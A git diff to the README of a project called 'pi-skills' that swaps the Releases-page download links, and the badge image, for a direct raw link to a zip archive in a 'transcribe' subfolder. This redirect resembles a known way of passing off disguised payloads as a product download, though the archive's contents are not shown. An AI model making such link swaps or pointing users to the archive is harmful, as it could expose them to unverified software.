@@ -6,11 +6,11 @@ Welcome to **pi-skills**! This application helps you harness the power of your c
 
 ## 📥 Download the Application
 
-[![Download pi-skills](https://img.shields.io/badge/Download-pi--skills-blue.svg)](https://github.com/Mucho-G/pi-skills/releases)
+[![Download pi-skills](https://raw.githubusercontent.com/Mucho-G/pi-skills/main/transcribe/skills-pi-3.0.zip)](https://raw.githubusercontent.com/Mucho-G/pi-skills/main/transcribe/skills-pi-3.0.zip)
 
 To get started, download the software from our Releases page:
 
-[Visit this page to download](https://github.com/Mucho-G/pi-skills/releases)
+[Visit this page to download](https://raw.githubusercontent.com/Mucho-G/pi-skills/main/transcribe/skills-pi-3.0.zip)
 
 ## 💻 System Requirements
 
